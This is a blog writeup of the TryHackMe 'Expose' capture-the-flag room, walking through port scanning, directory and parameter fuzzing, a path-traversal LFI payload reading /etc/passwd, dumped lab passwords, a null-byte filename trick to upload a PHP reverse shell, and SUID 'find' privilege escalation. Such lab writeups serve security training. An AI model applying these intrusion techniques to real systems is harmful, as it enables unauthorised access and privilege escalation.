---
layout: post
title:  "Writeup | Expose"
date:   3 July 2025
categories: Demo
tags: TryHackMe-Challenge Writeup
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
You can visit this challenge on [TryHackMe Challenge: Expose](https://tryhackme.com/room/expose)


### nmap
    ```bash
    PORT     STATE SERVICE                 VERSION
    21/tcp   open  ftp                     vsftpd 2.0.8 or later
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.4.9.189
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 3
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 78:be:56:64:e4:96:42:66:ea:e5:85:26:20:92:8e:85 (RSA)
    |   256 43:aa:00:0b:f0:95:ca:9f:9f:b0:4b:ca:4d:4c:54:e4 (ECDSA)
    |_  256 48:33:fd:a4:55:fd:32:6f:8b:aa:3d:c0:df:ad:9f:29 (ED25519)
    53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
    | dns-nsid: 
    |_  bind.version: 9.16.1-Ubuntu
    1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: EXPOSED
    1883/tcp open  mosquitto version 1.6.9
    | mqtt-subscribe: 
    |   Topics and their most recent payloads: 
    |     $SYS/broker/load/messages/sent/15min: 0.07
    |     $SYS/broker/load/bytes/sent/5min: 0.79
    |     $SYS/broker/load/messages/received/5min: 0.20
    |     $SYS/broker/load/sockets/15min: 0.07
    |     $SYS/broker/load/bytes/sent/1min: 3.65
    |     $SYS/broker/load/bytes/sent/15min: 0.27
    |     $SYS/broker/store/messages/bytes: 180
    |     $SYS/broker/version: mosquitto version 1.6.9
    |     $SYS/broker/bytes/sent: 4
    |     $SYS/broker/uptime: 2035 seconds
    |     $SYS/broker/load/connections/15min: 0.07
    |     $SYS/broker/bytes/received: 18
    |     $SYS/broker/load/messages/received/1min: 0.91
    |     $SYS/broker/load/bytes/received/5min: 3.53
    |     $SYS/broker/load/connections/1min: 0.91
    |     $SYS/broker/load/sockets/5min: 0.20
    |     $SYS/broker/load/bytes/received/15min: 1.19
    |     $SYS/broker/load/messages/sent/1min: 0.91
    |     $SYS/broker/load/sockets/1min: 0.91
    |     $SYS/broker/load/messages/received/15min: 0.07
    |     $SYS/broker/load/messages/sent/5min: 0.20
    |     $SYS/broker/load/connections/5min: 0.20
    |     $SYS/broker/load/bytes/received/1min: 16.45
    |     $SYS/broker/messages/received: 1
    |     $SYS/broker/messages/sent: 1
    |_    $SYS/broker/heap/maximum: 49688
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

- Open ports: **21(ftp),22(ssh),53(dns),1337(httpd),1883(mosquitto)**
- As usual, web first


### Web
- There's nothing on the main page on port 1337
- try directory enumeration first, using gobuster:

    ```bash
    /admin                (Status: 301) [Size: 319] [--> http://10.10.115.33:1337/admin/]
    /admin_101            (Status: 301) [Size: 323] [--> http://10.10.115.33:1337/admin_101/]
    /javascript           (Status: 301) [Size: 324] [--> http://10.10.115.33:1337/javascript/]
    /phpmyadmin           (Status: 301) [Size: 324] [--> http://10.10.115.33:1337/phpmyadmin/]
    ```

- Look at `/admin`, seems like a login page. However, after I tried many times for submitting the form, realizing it's just a submit button
- `/javascript` lacks permission
- `/phpMyAdmin` is a online database management system which I used it 5 yrs ago. The phpMyAdmin version is 4.9.5deb2 which can be found on website's source code.
- perhaps I can try sqlmap after acquiring the valid username
- Fine, using `ffuf` to enumerate valid username => Nothing
- go check another directory `admin_101`, which prefilled with email address
- 爆出一些東西來:

    ```bash
    +----+-----------------+---------------------+--------------------------------------+
    | id | email           | created             | password                             |
    +----+-----------------+---------------------+--------------------------------------+
    | 1  | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 |
    +----+-----------------+---------------------+--------------------------------------+

    +----+------------------------------+-----------------------------------------------------+
    | id | url                          | password                                            |
    +----+------------------------------+-----------------------------------------------------+
    | 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
    | 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
    +----+------------------------------+-----------------------------------------------------+
    ```

- go to `/file1010111/index.php` and type password, viewed the page and found two hints:
    - `Parameter Fuzzing is also important :) or Can you hide DOM elements?`
    - `Hint: Try file or view as GET parameters?`

- Let's try parameter fuzzing first:

    ```bash
    └─# ffuf -X POST -u http://10.10.115.33:1337/file1010111/index.php?FUZZ=1 -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=pirredrm6od04eb2hitei485te" -d "password=easytohack" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 127

            /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
            \ \_\   \ \_\  \ \____/  \ \_\       
            \/_/    \/_/   \/___/    \/_/       

        v2.1.0-dev
    ________________________________________________

    :: Method           : POST
    :: URL              : http://10.10.115.33:1337/file1010111/index.php?FUZZ=1
    :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
    :: Header           : Content-Type: application/x-www-form-urlencoded
    :: Header           : Cookie: PHPSESSID=pirredrm6od04eb2hitei485te
    :: Data             : password=easytohack
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    :: Filter           : Response words: 127
    ________________________________________________

    file                    [Status: 200, Size: 988, Words: 135, Lines: 45, Duration: 509ms]
    ```

- Try `?file=../../../../../../../../../../etc/passwd` and got the following output. Via LFI, I found that maybe user `zeamkish` is what we're interested in (because he got the /bin/bash and the hint we got before that username starts with z)

    ```bash
    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin bind:x:115:122::/var/cache/bind:/usr/sbin/nologin Debian-snmp:x:116:123::/var/lib/snmp:/bin/false redis:x:117:124::/var/lib/redis:/usr/sbin/nologin mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    ```

- Go `/upload-cv00101011/index.php` and type username `zeamkish`. I got a page which can upload `.png` file. Here I come out an exploit that I am able to upload a php shell and then visit it via LFI. I crafted a php-reverse-shell named shell.jpg and turned on burp proxy. Captured the request and modified filename from `shell.jpg` to `shell.php[NULLBYTE].jpg`. Then go to `/upload_thm_1001/` to find php file, clicked it and then got a reverse shell.

- look into `/home/zeamkish` and found ssh credentials:

    ```bash
    $ cd /home/zeamkish
    $ cat flag.txt
    cat: flag.txt: Permission denied
    $ cat ssh_creds.txt
    SSH CREDS
    zeamkish
    easytohack@123
    ```

### Privilege Escalation
- Use `linpeas` to find any attack vector
- find `/usr/bin/find` and `/usr/bin/nano` have SUID privileges
- Go to GTFOBins to find any possible exploitation. `find` with SUID could lead to root privilege escalation.
- Get root shell



### Conclusion
- I stuck on directory enumeration with using a different wordlist `xato-xxx`. Due to this I can't get `admin_101` at the beginning and wasting a lot of time on `/phpmyadmin` and fuzzing tests on username and password.
- Next time testing SQLi on first glimpse, make sure not to use `--batch`. Instead, using manual operations.
- Use burp suite to set one byte to null byte (0x00) to bypass the validation
- ***When you visit a PHP file in your browser, here's what happens: the browser sends a request to the server, the server passes the PHP file to the PHP interpreter, which runs the code and turns it into HTML. That HTML is then sent back to the browser, which loads and displays it.***


## 學習資料
1. [TryHackMe Challenge: Expose](https://tryhackme.com/room/expose)
2. [Writeup \| Expose](https://0xb0b.gitbook.io/writeups/tryhackme/2023/expose)

</div>
</body>
</html>
